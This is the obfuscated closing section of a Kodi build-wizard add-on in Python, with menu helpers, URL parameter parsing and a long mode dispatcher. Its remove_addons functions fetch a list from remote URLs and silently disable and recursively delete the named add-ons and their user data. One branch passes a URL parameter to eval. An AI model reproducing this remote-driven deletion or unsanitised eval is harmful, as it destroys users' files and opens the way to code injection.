	if OO0O0O0OOO0O0OO0O ==True :#line:5059
		try :#line:5060
			OOO0OO00O0O000OOO ,OOO00O00O000O00OO =wiz .splitNotify (HELPINFO )#line:5061
			if OOO0OO00O0O000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5062
			notify .helpinfo (OOO00O00O000O00OO ,True )#line:5063
		except Exception as OOOOO0000O0OO0OOO :#line:5064
			wiz .log ("Error on Notifications Window: %s"%str (OOOOO0000O0OO0OOO ),xbmc .LOGERROR )#line:5065
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5066
def testupdate ():#line:5068
	if BUILDNAME =="":#line:5069
		notify .updateWindow ()#line:5070
	else :#line:5071
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5072
def testfirst ():#line:5074
	notify .firstRun ()#line:5075
def testfirstRun ():#line:5077
	notify .firstRunSettings ()#line:5078
def fastinstall ():#line:5081
	notify .firstRuninstall ()#line:5082
def addDir (O0000000OO000OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5089
	O000O0000000OOO0O =sys .argv [0 ]#line:5090
	if not mode ==None :O000O0000000OOO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5091
	if not name ==None :O000O0000000OOO0O +="&name="+urllib .quote_plus (name )#line:5092
	if not url ==None :O000O0000000OOO0O +="&url="+urllib .quote_plus (url )#line:5093
	OO000O00O000000O0 =True #line:5094
	if themeit :O0000000OO000OOO0 =themeit %O0000000OO000OOO0 #line:5095
	OO0OO0O0O0OOO0OOO =xbmcgui .ListItem (O0000000OO000OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5096
	OO0OO0O0O0OOO0OOO .setInfo (type ="Video",infoLabels ={"Title":O0000000OO000OOO0 ,"Plot":description })#line:5097
	OO0OO0O0O0OOO0OOO .setProperty ("Fanart_Image",fanart )#line:5098
	if not menu ==None :OO0OO0O0O0OOO0OOO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5099
	OO000O00O000000O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000O0000000OOO0O ,listitem =OO0OO0O0O0OOO0OOO ,isFolder =True )#line:5100
	return OO000O00O000000O0 #line:5101
def addFile (OOOOOOOO0O000O0O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5103
	O0OOOO0O00O000OO0 =sys .argv [0 ]#line:5104
	if not mode ==None :O0OOOO0O00O000OO0 +="?mode=%s"%urllib .quote_plus (mode )#line:5105
	if not name ==None :O0OOOO0O00O000OO0 +="&name="+urllib .quote_plus (name )#line:5106
	if not url ==None :O0OOOO0O00O000OO0 +="&url="+urllib .quote_plus (url )#line:5107
	OOOO0O0OOO0OOO0O0 =True #line:5108
	if themeit :OOOOOOOO0O000O0O0 =themeit %OOOOOOOO0O000O0O0 #line:5109
	OOO0OOOO0O0O000OO =xbmcgui .ListItem (OOOOOOOO0O000O0O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5110
	OOO0OOOO0O0O000OO .setInfo (type ="Video",infoLabels ={"Title":OOOOOOOO0O000O0O0 ,"Plot":description })#line:5111
	OOO0OOOO0O0O000OO .setProperty ("Fanart_Image",fanart )#line:5112
	if not menu ==None :OOO0OOOO0O0O000OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:5113
	OOOO0O0OOO0OOO0O0 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOO0O00O000OO0 ,listitem =OOO0OOOO0O0O000OO ,isFolder =False )#line:5114
	return OOOO0O0OOO0OOO0O0 #line:5115
def get_params ():#line:5117
	O0OOO0OOO0O00O000 =[]#line:5118
	O00O0O00000OOO0O0 =sys .argv [2 ]#line:5119
	if len (O00O0O00000OOO0O0 )>=2 :#line:5120
		O00OOO00O0OO0O0O0 =sys .argv [2 ]#line:5121
		OOOOOOOO0OOO0OOOO =O00OOO00O0OO0O0O0 .replace ('?','')#line:5122
		if (O00OOO00O0OO0O0O0 [len (O00OOO00O0OO0O0O0 )-1 ]=='/'):#line:5123
			O00OOO00O0OO0O0O0 =O00OOO00O0OO0O0O0 [0 :len (O00OOO00O0OO0O0O0 )-2 ]#line:5124
		OOO00O000O00OO00O =OOOOOOOO0OOO0OOOO .split ('&')#line:5125
		O0OOO0OOO0O00O000 ={}#line:5126
		for OO00OO0000000000O in range (len (OOO00O000O00OO00O )):#line:5127
			OOOOO00OO00OOOO00 ={}#line:5128
			OOOOO00OO00OOOO00 =OOO00O000O00OO00O [OO00OO0000000000O ].split ('=')#line:5129
			if (len (OOOOO00OO00OOOO00 ))==2 :#line:5130
				O0OOO0OOO0O00O000 [OOOOO00OO00OOOO00 [0 ]]=OOOOO00OO00OOOO00 [1 ]#line:5131
		return O0OOO0OOO0O00O000 #line:5133
def remove_addons ():#line:5135
	try :#line:5136
			import json #line:5137
			O0OOO0O0O0O00000O =urllib2 .urlopen (remove_url ).readlines ()#line:5138
			for O00O00OO0OO00O0O0 in O0OOO0O0O0O00000O :#line:5139
				OOOOO0OO0OO0O00O0 =O00O00OO0OO00O0O0 .split (':')[1 ].strip ()#line:5141
				O00OO0OO000O000OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOOOO0OO0OO0O00O0 ,'false')#line:5142
				OOO0OO0O0OOOO0O00 =xbmc .executeJSONRPC (O00OO0OO000O000OO )#line:5143
				O0O000OO00000O00O =json .loads (OOO0OO0O0OOOO0O00 )#line:5144
				OOOO00OOO0OOOOOO0 =os .path .join (addons_folder ,OOOOO0OO0OO0O00O0 )#line:5146
				if os .path .exists (OOOO00OOO0OOOOOO0 ):#line:5148
					for O00000OOO0OO00OO0 ,OOO0000O000O000O0 ,O0O00O0O000O00OO0 in os .walk (OOOO00OOO0OOOOOO0 ):#line:5149
						for OO0OOO0OOOOOO0O0O in O0O00O0O000O00OO0 :#line:5150
							os .unlink (os .path .join (O00000OOO0OO00OO0 ,OO0OOO0OOOOOO0O0O ))#line:5151
						for O0O0OO0OOOO0OO00O in OOO0000O000O000O0 :#line:5152
							shutil .rmtree (os .path .join (O00000OOO0OO00OO0 ,O0O0OO0OOOO0OO00O ))#line:5153
					os .rmdir (OOOO00OOO0OOOOOO0 )#line:5154
			xbmc .executebuiltin ('Container.Refresh')#line:5156
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5157
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5158
	except :pass #line:5159
def remove_addons2 ():#line:5160
	try :#line:5161
			import json #line:5162
			OOO00OO00O0O0OOOO =urllib2 .urlopen (remove_url2 ).readlines ()#line:5163
			for O0O00O0O00OO000OO in OOO00OO00O0O0OOOO :#line:5164
				OOOOO0OO0O00OOO0O =O0O00O0O00OO000OO .split (':')[1 ].strip ()#line:5166
				OOOO0OO0O00OOO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(OOOOO0OO0O00OOO0O ,'false')#line:5167
				O00O0OOOOO000O00O =xbmc .executeJSONRPC (OOOO0OO0O00OOO000 )#line:5168
				OO0000O0O000O000O =json .loads (O00O0OOOOO000O00O )#line:5169
				OO0000O00O00OO0O0 =os .path .join (user_folder ,OOOOO0OO0O00OOO0O )#line:5171
				if os .path .exists (OO0000O00O00OO0O0 ):#line:5173
					for OO0OOOOO00O00OOOO ,OO00O0O000O000O0O ,OO000O000O00000O0 in os .walk (OO0000O00O00OO0O0 ):#line:5174
						for OO0OOO00O000O0OO0 in OO000O000O00000O0 :#line:5175
							os .unlink (os .path .join (OO0OOOOO00O00OOOO ,OO0OOO00O000O0OO0 ))#line:5176
						for OO00000O0OOO00OO0 in OO00O0O000O000O0O :#line:5177
							shutil .rmtree (os .path .join (OO0OOOOO00O00OOOO ,OO00000O0OOO00OO0 ))#line:5178
					os .rmdir (OO0000O00O00OO0O0 )#line:5179
	except :pass #line:5181
params =get_params ()#line:5182
url =None #line:5183
name =None #line:5184
mode =None #line:5185
try :mode =urllib .unquote_plus (params ["mode"])#line:5187
except :pass #line:5188
try :name =urllib .unquote_plus (params ["name"])#line:5189
except :pass #line:5190
try :url =urllib .unquote_plus (params ["url"])#line:5191
except :pass #line:5192
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5194
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5195
def setView (OO00000OOOOO0O0OO ,O0O000O0O0O00O000 ):#line:5196
	if wiz .getS ('auto-view')=='true':#line:5197
		OOOOO00O0O0O0OO0O =wiz .getS (O0O000O0O0O00O000 )#line:5198
		if OOOOO00O0O0O0OO0O =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOOO00O0O0O0OO0O ='55'#line:5199
		if OOOOO00O0O0O0OO0O =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOOO00O0O0O0OO0O ='50'#line:5200
		wiz .ebi ("Container.SetViewMode(%s)"%OOOOO00O0O0O0OO0O )#line:5201
if mode ==None :index ()#line:5203
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5205
elif mode =='builds':buildMenu ()#line:5206
elif mode =='viewbuild':viewBuild (name )#line:5207
elif mode =='buildinfo':buildInfo (name )#line:5208
elif mode =='buildpreview':buildVideo (name )#line:5209
elif mode =='install':buildWizard (name ,url )#line:5210
elif mode =='theme':buildWizard (name ,mode ,url )#line:5211
elif mode =='viewthirdparty':viewThirdList (name )#line:5212
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5213
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5214
elif mode =='maint':maintMenu (name )#line:5216
elif mode =='passpin':passandpin ()#line:5217
elif mode =='backmyupbuild':backmyupbuild ()#line:5218
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5219
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5220
elif mode =='advancedsetting':advancedWindow (name )#line:5221
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5222
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5223
elif mode =='asciicheck':wiz .asciiCheck ()#line:5224
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5225
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5226
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5227
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5228
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5229
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5230
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5231
elif mode =='currentsettings':viewAdvanced ()#line:5232
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5233
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5234
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5235
elif mode =='fixskin':backtokodi ()#line:5236
elif mode =='testcommand':testcommand ()#line:5237
elif mode =='logsend':logsend ()#line:5238
elif mode =='rdon':rdon ()#line:5239
elif mode =='rdoff':rdoff ()#line:5240
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5241
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5242
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5243
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5244
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5245
elif mode =='freshstart':freshStart ()#line:5246
elif mode =='forceupdate':wiz .forceUpdate ()#line:5247
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5248
elif mode =='forceclose':wiz .killxbmc ()#line:5249
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5250
elif mode =='hidepassword':wiz .hidePassword ()#line:5251
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5252
elif mode =='enableaddons':enableAddons ()#line:5253
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5254
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5255
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5256
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5257
elif mode =='uploadlog':uploadLog .Main ()#line:5258
elif mode =='viewlog':LogViewer ()#line:5259
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5260
elif mode =='viewerrorlog':errorChecking (all =True )#line:5261
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5262
elif mode =='purgedb':purgeDb ()#line:5263
elif mode =='fixaddonupdate':fixUpdate ()#line:5264
elif mode =='removeaddons':removeAddonMenu ()#line:5265
elif mode =='removeaddon':removeAddon (name )#line:5266
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5267
elif mode =='removedata':removeAddonData (name )#line:5268
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5269
elif mode =='systeminfo':systemInfo ()#line:5270
elif mode =='restorezip':restoreit ('build')#line:5271
elif mode =='restoregui':restoreit ('gui')#line:5272
elif mode =='restoreaddon':restoreit ('addondata')#line:5273
elif mode =='restoreextzip':restoreextit ('build')#line:5274
elif mode =='restoreextgui':restoreextit ('gui')#line:5275
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5276
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5277
elif mode =='apk':apkMenu (name )#line:5279
elif mode =='apkscrape':apkScraper (name )#line:5280
elif mode =='apkinstall':apkInstaller (name ,url )#line:5281
elif mode =='speed':speedMenu ()#line:5282
elif mode =='net':net_tools ()#line:5283
elif mode =='GetList':GetList (url )#line:5284
elif mode =='youtube':youtubeMenu (name )#line:5285
elif mode =='viewVideo':playVideo (url )#line:5286
elif mode =='addons':addonMenu (name )#line:5288
elif mode =='addoninstall':addonInstaller (name ,url )#line:5289
elif mode =='savedata':saveMenu ()#line:5291
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5292
elif mode =='managedata':manageSaveData (name )#line:5293
elif mode =='whitelist':wiz .whiteList (name )#line:5294
elif mode =='trakt':traktMenu ()#line:5296
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5297
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5298
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5299
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5300
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5301
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5302
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5303
elif mode =='realdebrid':realMenu ()#line:5305
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5306
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5307
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5308
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5309
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5310
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5311
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5312
elif mode =='login':loginMenu ()#line:5314
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5315
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5316
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5317
elif mode =='clearlogin':loginit .clearSaved (name )#line:5318
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5319
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5320
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5321
elif mode =='contact':notify .contact (CONTACT )#line:5323
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5324
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5325
elif mode =='developer':developer ()#line:5327
elif mode =='converttext':wiz .convertText ()#line:5328
elif mode =='createqr':wiz .createQR ()#line:5329
elif mode =='testnotify':testnotify ()#line:5330
elif mode =='testnotify2':testnotify2 ()#line:5331
elif mode =='servicemanual':servicemanual ()#line:5332
elif mode =='fastinstall':fastinstall ()#line:5333
elif mode =='testupdate':testupdate ()#line:5334
elif mode =='testfirst':testfirst ()#line:5335
elif mode =='testfirstrun':testfirstRun ()#line:5336
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5337
elif mode =='bg':wiz .bg_install (name ,url )#line:5339
elif mode =='bgcustom':wiz .bg_custom ()#line:5340
elif mode =='bgremove':wiz .bg_remove ()#line:5341
elif mode =='bgdefault':wiz .bg_default ()#line:5342
elif mode =='rdset':rdsetup ()#line:5343
elif mode =='mor':morsetup ()#line:5344
elif mode =='mor2':morsetup2 ()#line:5345
elif mode =='resolveurl':resolveurlsetup ()#line:5346
elif mode =='urlresolver':urlresolversetup ()#line:5347
elif mode =='forcefastupdate':forcefastupdate ()#line:5348
elif mode =='traktset':traktsetup ()#line:5349
elif mode =='placentaset':placentasetup ()#line:5350
elif mode =='flixnetset':flixnetsetup ()#line:5351
elif mode =='reptiliaset':reptiliasetup ()#line:5352
elif mode =='yodasset':yodasetup ()#line:5353
elif mode =='numbersset':numberssetup ()#line:5354
elif mode =='uranusset':uranussetup ()#line:5355
elif mode =='genesisset':genesissetup ()#line:5356
elif mode =='fastupdate':fastupdate ()#line:5357
elif mode =='folderback':folderback ()#line:5358
elif mode =='menudata':Menu ()#line:5359
elif mode ==2 :#line:5361
        wiz .torent_menu ()#line:5362
elif mode ==3 :#line:5363
        wiz .popcorn_menu ()#line:5364
elif mode ==8 :#line:5365
        wiz .metaliq_fix ()#line:5366
elif mode ==9 :#line:5367
        wiz .quasar_menu ()#line:5368
elif mode ==5 :#line:5369
        swapSkins ('skin.Premium.mod')#line:5370
elif mode ==13 :#line:5371
        wiz .elementum_menu ()#line:5372
elif mode ==16 :#line:5373
        wiz .fix_wizard ()#line:5374
elif mode ==17 :#line:5375
        wiz .last_play ()#line:5376
elif mode ==18 :#line:5377
        wiz .normal_metalliq ()#line:5378
elif mode ==19 :#line:5379
        wiz .fast_metalliq ()#line:5380
elif mode ==20 :#line:5381
        wiz .fix_buffer2 ()#line:5382
elif mode ==21 :#line:5383
        wiz .fix_buffer3 ()#line:5384
elif mode ==11 :#line:5385
        wiz .fix_buffer ()#line:5386
elif mode ==15 :#line:5387
        wiz .fix_font ()#line:5388
elif mode ==14 :#line:5389
        wiz .clean_pass ()#line:5390
elif mode ==22 :#line:5391
        wiz .movie_update ()#line:5392
elif mode =='adv_settings':buffer1 ()#line:5393
elif mode =='getpass':getpass ()#line:5394
elif mode =='setpass':setpass ()#line:5395
elif mode =='setuname':setuname ()#line:5396
elif mode =='passandUsername':passandUsername ()#line:5397
elif mode =='9':disply_hwr ()#line:5398
elif mode =='99':disply_hwr2 ()#line:5399
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))